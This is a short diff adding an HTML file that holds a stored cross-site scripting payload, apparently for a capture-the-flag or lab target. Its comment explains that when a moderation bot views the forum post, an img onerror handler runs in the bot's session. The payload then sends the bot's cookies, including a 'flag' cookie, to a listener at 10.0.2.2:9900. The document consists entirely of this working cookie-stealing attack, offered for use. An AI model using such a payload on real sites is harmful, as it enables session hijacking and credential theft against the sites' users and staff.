@@ -1,0 +1,5 @@
+<!-- Stored-XSS payload posted as forum content. HTML is rendered unsanitised.
+     When the moderation bot opens the thread, the onerror handler runs in the
+     bot's authenticated session and exfiltrates its cookies (which include a
+     non-HttpOnly `flag` cookie) to our listener at 10.0.2.2:9900. -->
+<img src=x onerror="new Image().src='http://10.0.2.2:9900/steal?c='+encodeURIComponent(document.cookie)">
